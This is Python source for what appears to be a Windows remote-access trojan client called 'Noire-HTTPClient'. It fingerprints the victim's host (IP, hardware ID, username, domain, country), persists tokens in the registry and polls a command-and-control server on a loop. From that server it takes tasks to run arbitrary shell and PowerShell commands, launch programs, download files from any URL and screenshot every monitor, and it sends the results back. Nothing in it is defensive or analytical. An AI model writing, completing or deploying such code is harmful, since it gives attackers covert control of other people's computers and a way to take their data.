from plistlib import UID
import requests
import jwt
import os
import subprocess
import time
import json
import platform
import winreg
import concurrent.futures
import mss
import base64

#INITIALIZE - wait, do whatever

global uID
uID = 'admin'

def check_http_access() -> bool:
    """
    Check HTTP access by sending a GET request to 'https://www.google.com' and return True if the response is successful, False otherwise.
    Returns:
        bool: True if HTTP access is successful, False otherwise.
    """
    try:
        response = requests.get('https://www.google.com')
        return response.ok
    except requests.RequestException:
        return False

def registry_setup() -> bool:
    """
    Function to set up the registry. Returns a tuple with the setup and token.
    """
    try:
        setup = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Noire-HTTPClient', 0, winreg.KEY_ALL_ACCESS)
        token = winreg.QueryValueEx(setup, 'Token')[0]
    except OSError:
        token = None
        setup = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Noire-HTTPClient')
    return setup, token

def store_registry_values(setup, token, uP, tP, rP):
    """
    Store registry values for the given setup using the provided token, user path, task path, and response path.
    """
    winreg.SetValueEx(setup, 'Token', 0, winreg.REG_SZ, token)
    winreg.SetValueEx(setup, 'UserPath', 0, winreg.REG_SZ, uP)
    winreg.SetValueEx(setup, 'TaskPath', 0, winreg.REG_SZ, tP)
    winreg.SetValueEx(setup, 'ResponsePath', 0, winreg.REG_SZ, rP)
    winreg.CloseKey(setup)

def checkSetup() -> bool:
    """
    Check if the setup is valid by performing various checks and accessing HTTP resources.
    Returns True if the setup is valid, False otherwise.
    """
    if not check_http_access():
        return False

    setup, token = registry_setup()
    if not token:
        token = generateJWT()
        if not token:
            return False

    try:
        resp = requests.get('http://127.0.0.1:5000/contact', headers={'User-Agent': 'NClient 1.0', 'NClient-Token': token})
        resp.raise_for_status()
        headers = resp.headers
        uP, tP, rP = headers['NClient-Path'], headers['NClient-TaskPath'], headers['NClient-ResponsePath']
        store_registry_values(setup, token, uP, tP, rP)
        return True
    except (requests.RequestException, KeyError):
        return False

def generateJWT() -> str:
    """
    Generate a JWT token based on the client's IP, operating system, user, hardware ID, timestamp, country, and domain.
    
    Returns:
        str: The JWT token generated.
    """
    try:
        response = requests.get('https://worldtimeapi.org/api/timezone/Etc/UTC')
    except requests.ConnectionError:
        return False
    response = json.loads(response.content)
    ip = response['client_ip']
    timestamp = response['unixtime']
    country = os.popen('''powershell -Command "gp 'HKCU:\\Control Panel\\International\\Geo\\' | select -exp Name"''').read()
    oS = platform.system() + '' + platform.release()
    hwid = os.popen('wmic csproduct get uuid').read().split('\n\n')[1].split()[0]
    dUN = os.popen('whoami').read().split('\\')
    uName = dUN[1].split('\n')[0]
    dName = dUN[0]
    global uID
    token = {'uID': uID,'ip': ip, 'os': oS, 'user': uName, 'hwid': hwid, 'time': timestamp, 'country': country, 'domain': dName}
    token = jwt.encode(token, 'Noire')
    return token

def parseTask(task:str, token:str, uniquePath:str, responsePath:str) -> None:
    task = jwt.decode(task, 'Noire', algorithms=["HS256"])
    args = task['args']; taskID = task['id']; task = task['command']
    responseMSG = None
    taskComplete = False
    if task == 'runapp':
        subprocess.Popen(args)
        responseMSG = b'True'
    elif task == 'execute':
        responseMSG = os.popen(args).read()
        responseMSG = bytes(responseMSG, 'utf-8')
    elif task == 'ps':
        responseMSG = os.popen(f'powershell -Command "{args}"').read()
        responseMSG = bytes(responseMSG, 'utf-8')
    elif task == 'download':
        try:
            response = requests.get(args['url'])
            response.raise_for_status()
            with open(args['location'], 'wb') as f:
                f.write(response.content)
            responseMSG = b'True'
        except requests.ConnectionError:
            responseMSG = b'False'
    elif task == 'screenshot':
        responseMSG = []
        for i in mss.mss().monitors:
            responseMSG.append(mss.mss().grab(i))
        responseMSG = b'*'.join(responseMSG)
    responseMSG = bytes(taskID, 'utf-8') + b'*' + base64.b64encode(responseMSG)
    while not taskComplete:
        try:
            response = requests.post(f'http://127.0.0.1:5000/c/{uniquePath}/{responsePath}', headers={
                'User-Agent': 'NClient 1.0', 'NClient-Token': token, 'NClient-TaskResponse': base64.b64encode(responseMSG)})
            response.raise_for_status()
        except requests.ConnectionError:
            time.sleep(5)
            pass
        taskComplete = True

if checkSetup():
    regTokens = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Noire-HTTPClient', 0, winreg.KEY_READ)
    uniquePath, taskPath, responsePath, token = winreg.QueryValueEx(regTokens, 'UserPath')[0], winreg.QueryValueEx(regTokens, 'TaskPath')[0], winreg.QueryValueEx(regTokens, 'ResponsePath')[0], winreg.QueryValueEx(regTokens, 'Token')[0]
    winreg.CloseKey(regTokens)
    while True:
        tasks = requests.get(f'http://127.0.0.1:5000/c/{uniquePath}/{taskPath}', headers={'User-Agent': 'NClient 1.0', 'NClient-Token': token}).text.split('\n')
        '''with concurrent.futures.ThreadPoolExecutor() as executor:
            for task in tasks:
                executor.submit(parseTask, task, token, uniquePath, responsePath)'''
        if tasks != ['']:
            print(tasks)
            for task in tasks:
                parseTask(task, token, uniquePath, responsePath)
        time.sleep(30)#make customiseable
        